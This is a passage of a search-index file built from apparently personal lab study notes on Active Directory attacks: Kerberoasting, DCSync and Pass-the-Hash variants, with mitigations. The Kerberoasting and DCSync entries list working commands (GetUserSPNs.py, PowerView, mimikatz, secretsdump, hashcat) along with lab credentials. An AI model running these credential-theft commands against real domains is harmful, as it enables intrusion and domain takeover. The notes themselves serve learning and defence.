Movement","lvl":3,"t":"3️⃣ What are $23 and $18? (Hash Types Explained)","c":"These $23 and $18 are hash formats used by offline cracking tools to identify Kerberos encryption types ."},{"id":"kerberos-rc4-hmac-ntlm-based-key","u":"01_attacks-lateral-movement.html#kerberos-rc4-hmac-ntlm-based-key","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 $23 – Kerberos RC4-HMAC (NTLM-based key)","c":"Older / legacy encryption Key derived from the NTLM hash of the service account password Very crackable if the password is weak Common in older domains or when RC4 is allowed Mental model: $23 = Kerberos ticket encrypted using NTLM-based RC4 key This is why $23 Kerberoasting is often very fast to crack."},{"id":"kerberos-aes256-cts-hmac-sha1","u":"01_attacks-lateral-movement.html#kerberos-aes256-cts-hmac-sha1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 $18 – Kerberos AES256-CTS-HMAC-SHA1","c":"Modern Kerberos encryption Stronger crypto Still crackable offline, but much slower Common in newer domains with AES enabled Mental model: $18 = Kerberos ticket encrypted using AES-256 derived from the service account password So $18 is harder to crack, but still vulnerable if the password is weak ."},{"id":"how-do-we-know-if-its-23-or-18","u":"01_attacks-lateral-movement.html#how-do-we-know-if-its-23-or-18","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ How do we know if it’s $23 or $18?","c":"The encryption type is chosen by the KDC based on: Domain functional level Kerberos policies What encryption types the service account supports What the client requests When attackers request a TGS, the returned ticket is in a specific encryption type. The Kerberoasting tool then formats it like: $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01:1433*$HEXDATA... or $krb5tgs$18$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01:1433*$HEXDATA... The $23 or $18 tells the cracker which Kerberos crypto was used . So: $23 → RC4-HMAC Kerberos ticket $18 → AES256 Kerberos ticket"},{"id":"how-kdc-encrypts-tgs-how-attacks-exploits","u":"01_attacks-lateral-movement.html#how-kdc-encrypts-tgs-how-attacks-exploits","sec":"Attacks + Lateral Movement","lvl":3,"t":"How Kdc Encrypts TGS & How Attacks Exploits","c":""},{"id":"step-by-step-how-kdc-issues-the-tgs-service-ticket","u":"01_attacks-lateral-movement.html#step-by-step-how-kdc-issues-the-tgs-service-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ Step-by-Step: How KDC Issues the TGS (Service Ticket)","c":""},{"id":"step-2.1-client-has-a-tgt","u":"01_attacks-lateral-movement.html#step-2.1-client-has-a-tgt","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 2.1 – Client has a TGT","c":"alice → KDC: login KDC → alice: TGT TGT proves Alice is authenticated."},{"id":"step-2.2-client-requests-tgs-for-the-service","u":"01_attacks-lateral-movement.html#step-2.2-client-requests-tgs-for-the-service","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 2.2 – Client requests TGS for the service","c":"Alice asks: “Give me a service ticket for MSSQLSvc/DB01.corp.local:1433” alice (with TGT) → KDC: TGS request for MSSQLSvc/DB01"},{"id":"step-2.3-kdc-builds-the-tgs-whats-inside","u":"01_attacks-lateral-movement.html#step-2.3-kdc-builds-the-tgs-whats-inside","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 2.3 – KDC builds the TGS (what’s inside)","c":"The service ticket (TGS) contains: Client identity: alice@corp.local Service identity: MSSQLSvc/DB01.corp.local:1433 Timestamp + validity window Session key (for client ↔︎ service communication) Flags (forwardable, renewable, etc.) Think of it like: { Client: alice@corp.local Service: MSSQLSvc/DB01.corp.local:1433 ValidFrom: 10:00 ValidUntil: 20:00 SessionKey: K_session }"},{"id":"step-2.4-kdc-encrypts-the-tgs-with-the-service-account-secret","u":"01_attacks-lateral-movement.html#step-2.4-kdc-encrypts-the-tgs-with-the-service-account-secret","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 2.4 – KDC encrypts the TGS with the service account secret","c":"This whole structure is encrypted using: 🔐 The Kerberos key derived from CORP’s password Encrypt(TGS, KerberosKey(sqlsvc_password)) So only the **real SQL service running as CORP* can decrypt it. Then the KDC sends this encrypted blob back to Alice: KDC → alice: Encrypted TGS (service ticket)"},{"id":"how-the-service-verifies-the-tgs","u":"01_attacks-lateral-movement.html#how-the-service-verifies-the-tgs","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ How the Service Verifies the TGS","c":"Now Alice connects to SQL Server: alice → SQL Service: TGS The SQL service: Takes the encrypted TGS Derives its own Kerberos key from its password Tries to decrypt the TGS If decryption succeeds: Ticket is valid Alice is authenticated If decryption fails: Ticket is rejected Decrypt(TGS, KerberosKey(sqlsvc_password)) ✔ success → accept user ✘ fail → reject user This is exactly why Kerberoasting works."},{"id":"mitigation-2","u":"01_attacks-lateral-movement.html#mitigation-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Mitigation","c":""},{"id":"core-mitigations-most-effective-first","u":"01_attacks-lateral-movement.html#core-mitigations-most-effective-first","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 Core Mitigations (Most Effective First)","c":""},{"id":"use-gmsa-for-services-kills-kerberoasting-in-practice","u":"01_attacks-lateral-movement.html#use-gmsa-for-services-kills-kerberoasting-in-practice","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 1️⃣ Use gMSA for services (kills Kerberoasting in practice)","c":"Group Managed Service Accounts (gMSA) use: Long, random, auto-rotated passwords Not known by humans Not reused Result: Even if attackers Kerberoast the ticket, offline cracking becomes unrealistic . 👉 This is the single best mitigation."},{"id":"enforce-long-random-passwords-on-service-accounts","u":"01_attacks-lateral-movement.html#enforce-long-random-passwords-on-service-accounts","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 2️⃣ Enforce long, random passwords on service accounts","c":"If you must use classic service accounts: Minimum guidance: 30+ characters Random (not dictionary-based) No reuse across services Rotate periodically Kerberoasting dies on strong entropy."},{"id":"reduce-service-account-privileges","u":"01_attacks-lateral-movement.html#reduce-service-account-privileges","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 3️⃣ Reduce service account privileges","c":"Service accounts should: NOT be Domain Admins NOT be local admin everywhere Only have the minimum rights needed So even if cracked, blast radius is small."},{"id":"remove-unnecessary-spns","u":"01_attacks-lateral-movement.html#remove-unnecessary-spns","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 4️⃣ Remove unnecessary SPNs","c":"Audit SPNs: Remove stale / unused SPNs Remove SPNs tied to old services Ensure SPNs belong to the correct account Fewer SPNs = fewer roastable targets."},{"id":"prefer-modern-kerberos-crypto-disable-rc4-where-possible","u":"01_attacks-lateral-movement.html#prefer-modern-kerberos-crypto-disable-rc4-where-possible","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 5️⃣ Prefer modern Kerberos crypto (Disable RC4 where possible)","c":"Legacy RC4 (Kerberoasting $23 ) cracks fast. Harden Kerberos: Prefer AES128 / AES256 Disable RC4 where compatibility allows Raise domain functional level if possible This doesn’t prevent Kerberoasting, but it massively increases crack time ."},{"id":"poc-1","u":"01_attacks-lateral-movement.html#poc-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"PoC","c":""},{"id":"windows-2","u":"01_attacks-lateral-movement.html#windows-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"Windows","c":"Step 1 - login to rdp xfreerdp /u:htb-student /p:‘Academy_student_AD!’ /v:10.129.234.199 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution Step 2 - run setspn to get all the spn account setspn.exe -Q / image.png image.png Step 3 - Loads the .NET assembly needed for Kerberos classes Add-Type -AssemblyName System.IdentityModel Step 4 - Triggers a TGS request for the given SPN using your current TGT New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “ vmware/inlanefreight.local” image.png Step 5 - import powerview module Import-Module ..ps1 Step 6 - get the samaccountname of all the spn Get-DomainUser * -spn | select samaccountname Step 7 - Get the tsg of service account in hashcat format Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat image.png Step 8 - crack it using hashcat image.png image.png"},{"id":"linux-2","u":"01_attacks-lateral-movement.html#linux-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"Linux","c":"Step 1 - login using ssh Step 2 - list all the service principal names ( SPN ) GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Klmcargo2 image.png Step 3 - request TSG for SAPService GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService image.png Step 4 - save it on a file and crack it using hascat hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt image.png image.png"},{"id":"dcsync","u":"01_attacks-lateral-movement.html#dcsync","sec":"Attacks + Lateral Movement","lvl":2,"t":"DCSync","c":"DCSync transfers the password hashes from the Domain Controller to you through legitimate AD replication APIs, because the attacker account has replication permissions."},{"id":"what-is-dcsync","u":"01_attacks-lateral-movement.html#what-is-dcsync","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 1. What is DCSync?","c":"DCSync is an attack technique where an attacker pretends to be a Domain Controller and requests user password data (NTLM hashes, Kerberos keys) through AD replication APIs . It abuses the DSGetNCChanges function inside the Microsoft Directory Replication Service (DRS) Remote Protocol. Key idea: AD will replicate secrets to any security principal (user/computer) that has replication permissions."},{"id":"what-exactly-does-dcsync-retrieve","u":"01_attacks-lateral-movement.html#what-exactly-does-dcsync-retrieve","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 2. What exactly does DCSync retrieve?","c":"DCSync can pull: NTLM Hash (for NTLM auth) Kerberos AES128/AES256 keys Kerberos RC4 key LM Hash (if stored) Password Last Set SID, UPN, etc. This allows: Pass-the-Hash Pass-the-Ticket Golden Ticket creation Skeleton Key attack User impersonation"},{"id":"do-you-need-domain-admin-credentials","u":"01_attacks-lateral-movement.html#do-you-need-domain-admin-credentials","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 3. Do you need Domain Admin credentials?","c":"NO — Domain Admin is not required . Domain Admins have the permissions by default , but any user/computer with replication rights can perform DCSync . DCSync requires the following ACL rights : ✔ Required Active Directory Rights A user must have these 3 permissions on the Domain root object : DS-Replication-Get-Changes DS-Replication-Get-Changes-All DS-Replication-Get-Changes-In-Filtered-Set (for 2016+) These permissions are delegated through Access Control Entries (ACEs) on the domain object in AD."},{"id":"why-these-permissions-work","u":"01_attacks-lateral-movement.html#why-these-permissions-work","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 Why These Permissions Work","c":"In Active Directory , Domain Controllers replicate data between each other. Normally this happens like: 🖥️ DC2 → asks DC1 “Give me updated directory data” DC1 responds with: 📦 User objects 📦 Password hashes 📦 Kerberos keys The DCSync attack abuses this exact mechanism . Instead of being a DC: 👤 Attacker pretends to be a replication partner ."},{"id":"so-who-has-these-permissions-by-default","u":"01_attacks-lateral-movement.html#so-who-has-these-permissions-by-default","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 4. So who has these permissions by default?","c":"User/Group | Has Replication Rights? | — | — | Domain Admins | ✅ Yes | Enterprise Admins | ✅ Yes | Administrators | ✅ Yes | Domain Controllers (machine accounts) | ✅ Yes | Read-Only Domain Controllers (RODC) | ❌ Not full replication of secrets | Any user with delegated replication rights | ⚠️ Yes (if misconfigured) |"},{"id":"how-misconfigurations-enable-dcsync","u":"01_attacks-lateral-movement.html#how-misconfigurations-enable-dcsync","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 5. How Misconfigurations Enable DCSync","c":"DCSync becomes dangerous when: Administrators mistakenly grant “Replicating Directory Changes” to normal users. Privilege escalation attacks (Kerberoasting, ACL abuse, RBCD) give the attacker an account/machine with replication rights. ‘Backup Operators’ group gets abused (it does NOT directly give replication rights, but often delegated incorrectly)."},{"id":"dcsync-attack-flow-clear-practical","u":"01_attacks-lateral-movement.html#dcsync-attack-flow-clear-practical","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 6. DCSync Attack Flow (Clear, Practical)","c":"⭐ Step-by-step: Step 1: Get credentials of a user with replication rights This can be: Domain Admin creds Compromised DC machine account (Computer$) Any delegated user PrivEsc to a group with these rights Step 2: Run DCSync Mimikatz mimikatz.exe lsadump::dcsync /user:Administrator Alternatively: lsadump::dcsync /domain:corp.local /user:krbtgt Impacket-secretsdump (Linux) secretsdump.py domain/user:password@dc-ip To pull only a specific user: secretsdump.py -just-dc-user administrator domain/user:pass@dc-ip To pull KRBTGT key: secretsdump.py -just-dc-user krbtgt domain/user:pass@dc-ip"},{"id":"important-you-do-not-need-local-admin-on-domain-controllers","u":"01_attacks-lateral-movement.html#important-you-do-not-need-local-admin-on-domain-controllers","sec":"Attacks + Lateral Movement","lvl":3,"t":"⚠️ 7. IMPORTANT — You do NOT need local admin on domain controllers","c":"Local admin on a single workstation does NOT give replication rights. You need: Domain-level privileges or Specific ACL permissions Local Admin → Priv esc does NOT equal DCSync."},{"id":"how-to-check-if-a-user-has-these-permissions","u":"01_attacks-lateral-movement.html#how-to-check-if-a-user-has-these-permissions","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 8. How to Check if a User Has These Permissions","c":"Using PowerView : Get-ObjectAcl -DistinguishedName \"DC=corp,DC=local\" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"Replicate\"} To check a specific user: Get-ObjectAcl -DistinguishedName \"DC=corp,DC=local\" -ResolveGUIDs | ? {$_.IdentityReference -match \"username\"} This will show if the user has: Replicating Directory Changes Replicating Directory Changes All Replicating Directory Changes Filtered Set"},{"id":"how-attackers-gain-replication-rights","u":"01_attacks-lateral-movement.html#how-attackers-gain-replication-rights","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 9. How Attackers Gain Replication Rights","c":"Without DA creds, attackers often escalate to replication rights by abusing: ACL abuse (GenericWrite, GenericAll, WriteDACL) Give themselves replication privileges. Resource Based Constrained Delegation (RBCD) Compromising a computer account → impersonate DA → DCSync. Compromising a domain controller computer account Ex: DC01$ credentials allow full DCSync. Kerberoasting + Password reuse Crack a service account → it has replication rights (rare but misconfigured)."},{"id":"pass-the-hash","u":"01_attacks-lateral-movement.html#pass-the-hash","sec":"Attacks + Lateral Movement","lvl":2,"t":"Pass The Hash","c":""},{"id":"ntml-ntmlv2","u":"01_attacks-lateral-movement.html#ntml-ntmlv2","sec":"Attacks + Lateral Movement","lvl":3,"t":"NTML / NTMLV2","c":""},{"id":"nt-hash","u":"01_attacks-lateral-movement.html#nt-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"NT hash","c":"Definition The NT hash is the cryptographic representation of a Windows password. NT hash = MD4( UTF-16LE(password) ) Key property The NT hash itself is treated as the authentication secret by Windows."},{"id":"ntlm","u":"01_attacks-lateral-movement.html#ntlm","sec":"Attacks + Lateral Movement","lvl":3,"t":"NTLM","c":"Definition NTLM (NT LAN Manager) is a challenge–response authentication protocol used by Windows when Kerberos is unavailable. Purpose Prove knowledge of a password without sending it"},{"id":"ntlmv1","u":"01_attacks-lateral-movement.html#ntlmv1","sec":"Attacks + Lateral Movement","lvl":3,"t":"NTLMv1","c":"Definition NTLMv1 is the legacy implementation of NTLM using DES-based responses . Status Weak Deprecated Still seen on very old systems"},{"id":"ntlmv2","u":"01_attacks-lateral-movement.html#ntlmv2","sec":"Attacks + Lateral Movement","lvl":3,"t":"NTLMv2","c":"Definition NTLMv2 is the modern NTLM authentication algorithm that: Adds timestamps Adds client challenge Uses HMAC-MD5 Prevents replay attacks Important NTLMv2 still depends on the NT hash"},{"id":"pass-the-hash-pth","u":"01_attacks-lateral-movement.html#pass-the-hash-pth","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass-the-Hash (PtH)","c":"Definition Pass-the-Hash is an attack where authentication is performed using the NT hash directly , without knowing the plaintext password."},{"id":"when-ntlm-vs-kerberos-is-used","u":"01_attacks-lateral-movement.html#when-ntlm-vs-kerberos-is-used","sec":"Attacks + Lateral Movement","lvl":3,"t":"2. When NTLM vs Kerberos is used","c":"Scenario | Auth used | — | — | Domain login | Kerberos (default) | Local account login | NTLM | Cross-domain without trust | NTLM | IP address access | NTLM | Legacy services | NTLM | SMB without SPN | NTLM | ➡️ NTLM is the fallback ➡️ Fallback = attack surface"},{"id":"what-happens-when-a-user-types-a-password-very-important","u":"01_attacks-lateral-movement.html#what-happens-when-a-user-types-a-password-very-important","sec":"Attacks + Lateral Movement","lvl":3,"t":"3. What happens when a user types a password (very important)","c":"Let’s say user Alice logs in."},{"id":"step-1-password-processing-local-system","u":"01_attacks-lateral-movement.html#step-1-password-processing-local-system","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 1: Password processing (local system)","c":"User types password → Windows does NOT store plaintext Instead: Password → UTF-16LE → MD4 → NT hash Example: Password: P@ssw0rd NT hash : 8846f7eaee8fb117ad06bdd830b7586c"},{"id":"step-2-where-the-nt-hash-goes","u":"01_attacks-lateral-movement.html#step-2-where-the-nt-hash-goes","sec":"Attacks + Lateral Movement","lvl":4,"t":"Step 2: Where the NT hash goes","c":"Location | Why | — | — | LSASS memory | Authentication | SAM / NTDS.dit | Persistence | Cached creds | Offline login | ❗ Plaintext password is discarded"},{"id":"ntlm-authentication-high-level-flow","u":"01_attacks-lateral-movement.html#ntlm-authentication-high-level-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"4. NTLM authentication – high level flow","c":"NTLM proves: “I know the NT hash” General NTLM flow (common to v1 and v2) Client says: “I want to authenticate” Server sends random challenge Client computes response using NT hash Server recomputes and compares"},{"id":"ntlmv1-how-it-works","u":"01_attacks-lateral-movement.html#ntlmv1-how-it-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"5. NTLMv1 – how it works","c":"Logic Response = DES( NT_hash, ServerChallenge ) Properties No timestamp No client challenge Replay possible Weak crypto Security level ❌ Broken ❌ Replayable ❌ Easily crackable"},{"id":"ntlmv2-how-it-works-proper-logic","u":"01_attacks-lateral-movement.html#ntlmv2-how-it-works-proper-logic","sec":"Attacks + Lateral Movement","lvl":3,"t":"6. NTLMv2 – how it works (proper logic)","c":"NTLMv2 does NOT replace the NT hash It wraps it with more data"},{"id":"step-by-step-ntlmv2-logic","u":"01_attacks-lateral-movement.html#step-by-step-ntlmv2-logic","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step-by-step NTLMv2 logic","c":"Step 1 – NTLMv2 hash creation NTLMv2_hash = HMAC-MD5( NT_hash, Username + Domain ) Step 2 – Client builds a blob The blob contains: Timestamp Client challenge Target info Step 3 – Final response NTLMv2_Response = HMAC-MD5( NTLMv2_hash, ServerChallenge + Blob ) Step 4 – Server validation Server: Retrieves NT hash Rebuilds NTLMv2_hash Verifies response ✔️ Auth success"},{"id":"why-ntlmv2-exists-design-goal","u":"01_attacks-lateral-movement.html#why-ntlmv2-exists-design-goal","sec":"Attacks + Lateral Movement","lvl":3,"t":"7. Why NTLMv2 exists (design goal)","c":"Threat | NTLMv1 | NTLMv2 | — | — | — | Replay attack | ❌ | ✅ | MITM resistance | ❌ | Partial | Weak crypto | ❌ | Improved | ⚠️ Goal was transport security, NOT hash secrecy"},{"id":"where-pass-the-hash-fits-key-concept","u":"01_attacks-lateral-movement.html#where-pass-the-hash-fits-key-concept","sec":"Attacks + Lateral Movement","lvl":3,"t":"8. Where Pass-the-Hash fits (key concept)","c":"Important truth NTLMv2 still trusts the NT hash as the root secret. So if attacker has: NT hash + Username + Domain They can: Generate NTLMv2 responses Authenticate successfully ➡️ No password required"},{"id":"pass-the-hash-1","u":"01_attacks-lateral-movement.html#pass-the-hash-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass The Hash","c":""},{"id":"definition-core","u":"01_attacks-lateral-movement.html#definition-core","sec":"Attacks + Lateral Movement","lvl":3,"t":"Definition (core)","c":"Pass-the-Hash (PtH) is an authentication abuse technique where: An attacker authenticates as a user by supplying the NT password hash directly, instead of the user’s plaintext password. Key point: The hash is not cracked The hash is not replayed The hash is used as the credential"},{"id":"why-pass-the-hash-exists-root-cause","u":"01_attacks-lateral-movement.html#why-pass-the-hash-exists-root-cause","sec":"Attacks + Lateral Movement","lvl":3,"t":"2. Why Pass-the-Hash Exists (root cause)","c":"Windows design assumption Windows assumes: “If you can prove knowledge of the NT hash, you must know the password.” Therefore: NT hash = proof of identity Password is only a derivation source This assumption is what PtH abuses."},{"id":"where-pth-sits-in-the-authentication-chain","u":"01_attacks-lateral-movement.html#where-pth-sits-in-the-authentication-chain","sec":"Attacks + Lateral Movement","lvl":3,"t":"3. Where PtH sits in the authentication chain","c":"Password ──► NT hash ──► NTLM / NTLMv2 response ──► Authentication PtH attacks this level: ┌──────────────┐ Attacker│ NT hash only │ └──────────────┘ The password is skipped entirely ."},{"id":"preconditions-for-pass-the-hash","u":"01_attacks-lateral-movement.html#preconditions-for-pass-the-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"4. Preconditions for Pass-the-Hash","c":"PtH is not magic . These conditions must be true: Required NTLM authentication is allowed Attacker has the NT hash Target accepts NTLM (local account, fallback, legacy) Not required Plaintext password ❌ Password cracking ❌ User interaction ❌"},{"id":"where-the-nt-hash-used-in-pth-comes-from","u":"01_attacks-lateral-movement.html#where-the-nt-hash-used-in-pth-comes-from","sec":"Attacks + Lateral Movement","lvl":3,"t":"5. Where the NT hash used in PtH comes from","c":"Common sources Source | How | — | — | LSASS memory | Logged-in users | SAM | Local accounts | NTDS.dit | Domain accounts | Cached creds | Offline logons | 👉 PtH always starts after credential access"},{"id":"pass-the-hash-vs-normal-login-key-contrast","u":"01_attacks-lateral-movement.html#pass-the-hash-vs-normal-login-key-contrast","sec":"Attacks + Lateral Movement","lvl":3,"t":"6. Pass-the-Hash vs normal login (key contrast)","c":"Normal login User types password System computes NT hash NT hash used internally Pass-the-Hash login Attacker already has NT hash NT hash injected directly Password never exists ➡️ Authentication logic is identical after step 2"},{"id":"how-pth-actually-works-internal-logic","u":"01_attacks-lateral-movement.html#how-pth-actually-works-internal-logic","sec":"Attacks + Lateral Movement","lvl":3,"t":"7. How PtH actually works (internal logic)","c":"Let’s formalize it. What the server checks The server never checks the password . It only checks: “Does the response match what I get using the stored NT hash?” Attacker advantage If attacker has the NT hash: They can compute any valid NTLM or NTLMv2 response The server sees no difference"},{"id":"pass-the-hash-with-ntlmv1-vs-ntlmv2","u":"01_attacks-lateral-movement.html#pass-the-hash-with-ntlmv1-vs-ntlmv2","sec":"Attacks + Lateral Movement","lvl":3,"t":"8. Pass-the-Hash with NTLMv1 vs NTLMv2","c":"Important clarification Question | Answer | — | — | Does PtH use NTLMv1? | Yes | Does PtH work with NTLMv2? | Yes | Does NTLMv2 stop PtH? | No |"},{"id":"why","u":"01_attacks-lateral-movement.html#why","sec":"Attacks + Lateral Movement","lvl":4,"t":"Why?","c":"Because both protocols ultimately rely on the NT hash . NTLMv2 improves: Replay resistance Message integrity But does not protect the NT hash itself ."},{"id":"example-pth-logic-using-ntlmv2-conceptual","u":"01_attacks-lateral-movement.html#example-pth-logic-using-ntlmv2-conceptual","sec":"Attacks + Lateral Movement","lvl":3,"t":"9. Example: PtH logic using NTLMv2 (conceptual)","c":"Attacker has: Username: Admin Domain: CORP NT hash: 8846f7eaee8fb117ad06bdd830b7586c NTLMv2 process (unchanged) NTLMv2_hash = HMAC-MD5( NT_hash, Username + Domain ) The attacker can compute this perfectly , because: NT hash is the only secret required ✔️ Authentication succeeds ❌ Password never known"},{"id":"overpass-the-hash-pass-the-key-precursor","u":"01_attacks-lateral-movement.html#overpass-the-hash-pass-the-key-precursor","sec":"Attacks + Lateral Movement","lvl":3,"t":"OverPass-the-Hash (Pass-the-Key precursor)","c":"This is where confusion usually starts."},{"id":"what-it-is","u":"01_attacks-lateral-movement.html#what-it-is","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 What It Is","c":"Using an NT hash to obtain a Kerberos TGT You are converting NTLM material into Kerberos authentication ."},{"id":"why-it-exists","u":"01_attacks-lateral-movement.html#why-it-exists","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Why It Exists","c":"Kerberos still supports: RC4-HMAC Which uses the NT hash as the Kerberos key So: NThash == Kerberos RC4 key"},{"id":"where-it-lives-in-the-flow","u":"01_attacks-lateral-movement.html#where-it-lives-in-the-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Where It Lives in the Flow","c":"Authentication phase . NThash → AS-REQ KDC verifies → issues TGT This is a real login , not reuse."},{"id":"key-difference-vs-pth","u":"01_attacks-lateral-movement.html#key-difference-vs-pth","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Key Difference vs PtH","c":"Aspect | PtH | OverPass-the-Hash | — | — | — | Protocol | NTLM | Kerberos | Material | NT hash | NT hash / AES / RC4 | Output | NTLM session | Kerberos TGT | Modern viability | ❌ declining | ✅ still common |"},{"id":"why-its-called-overpass","u":"01_attacks-lateral-movement.html#why-its-called-overpass","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Why It’s Called “OverPass”","c":"You: Start with NTLM material “Jump over” NTLM End in Kerberos"},{"id":"limitations","u":"01_attacks-lateral-movement.html#limitations","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Limitations","c":"Requires RC4 enabled AES-only domains break this Password change invalidates hash"},{"id":"one-line-truth","u":"01_attacks-lateral-movement.html#one-line-truth","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔑 One-line truth","c":"OverPass-the-Hash = NT hash → Kerberos TGT"},{"id":"pass-the-key-ptk","u":"01_attacks-lateral-movement.html#pass-the-key-ptk","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass-the-Key (PtK)","c":""},{"id":"what-it-is-1","u":"01_attacks-lateral-movement.html#what-it-is-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 What It Is","c":"Using Kerberos long-term keys (AES/RC4) directly to authenticate No NTLM involved at all."},{"id":"what-keys-are-used","u":"01_attacks-lateral-movement.html#what-keys-are-used","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 What Keys Are Used","c":"AES256 key AES128 key RC4 key (NT hash) Stored in: NTDS.dit LSASS DCSync output"},{"id":"where-it-lives-in-the-flow-1","u":"01_attacks-lateral-movement.html#where-it-lives-in-the-flow-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Where It Lives in the Flow","c":"Authentication phase (Kerberos-native) Kerberoskey → AS-REQ KDC verifies → TGT issued"},{"id":"why-its-stronger-than-overpass-the-hash","u":"01_attacks-lateral-movement.html#why-its-stronger-than-overpass-the-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Why It’s Stronger Than OverPass-the-Hash","c":"Aspect | OverPass | Pass-the-Key | — | — | — | Uses NT hash | Yes | Optional | Supports AES | ❌ | ✅ | Modern AD safe | ❌ | ✅ | Future-proof | ❌ | ✅ |"},{"id":"why-blue-teams-fear-ptk","u":"01_attacks-lateral-movement.html#why-blue-teams-fear-ptk","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Why Blue Teams Fear PtK","c":"AES keys don’t “look suspicious” Harder to distinguish from real logons NTLM can be fully disabled and this still works"},{"id":"one-line-truth-1","u":"01_attacks-lateral-movement.html#one-line-truth-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔑 One-line truth","c":"Pass-the-Key = Kerberos-native authentication using long-term keys"},{"id":"difference-between-them","u":"01_attacks-lateral-movement.html#difference-between-them","sec":"Attacks + Lateral Movement","lvl":3,"t":"Difference Between Them","c":""},{"id":"short-precise-answer-first","u":"01_attacks-lateral-movement.html#short-precise-answer-first","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔑 Short, Precise Answer First","c":"Only Kerberos-based techniques result in a TGT. Pass-the-Hash (classic) does NOT get a TGT. OverPass-the-Hash and Pass-the-Key do get a TGT, but via different secrets and checks. Now let’s lock this down cleanly ."},{"id":"pass-the-hash-pth-no-tgt","u":"01_attacks-lateral-movement.html#pass-the-hash-pth-no-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Pass-the-Hash (PtH) — NO TGT","c":"What it actually does Uses NT hash Authenticates via NTLM Talks directly to the target service KDC is never involved Flow Client → NTLM challenge NT hash → response Target validates → session created Key point Kerberos not used No TGT Works only where NTLM is allowed ✔ Lateral movement ❌ Kerberos tickets"},{"id":"overpass-the-hash-opth-yes-tgt","u":"01_attacks-lateral-movement.html#overpass-the-hash-opth-yes-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ OverPass-the-Hash (OPtH) — YES, TGT","c":"What it really is Using an NT hash as a Kerberos RC4 key Why this works: RC4-HMAC Kerberos key = NT hash Flow NThash → AS-REQ (RC4) KDC verifies → issues TGT Important nuance NT hash is not used for NTLM here It is used as a Kerberos secret ✔ Gets a TGT ✔ Uses KDC ❌ Breaks if RC4 is disabled"},{"id":"pass-the-key-ptk-yes-tgt","u":"01_attacks-lateral-movement.html#pass-the-key-ptk-yes-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Pass-the-Key (PtK) — YES, TGT","c":"What it is Kerberos-native authentication using long-term keys Keys used: AES256 AES128 RC4 (optional) Flow Kerberoskey →AS-REQ (AES/RC4) KDC verifies → issues TGT Why it matters Works even if NTLM is disabled Works in modern AD environments ✔ Gets a TGT ✔ Modern ✔ Stealthier Goal → Kerberos access → TGT But security enforcement happens at the start , not the end. What matters is: What secret is being validated, and by whom"},{"id":"exact-difference-in-one-table-this-ends-the-confusion","u":"01_attacks-lateral-movement.html#exact-difference-in-one-table-this-ends-the-confusion","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Exact Difference in One Table (This Ends the Confusion)","c":"Technique | Uses | Talks To | Protocol | Gets TGT | — | — | — | — | — | Pass-the-Hash | NT hash | Target service | NTLM | ❌ No | 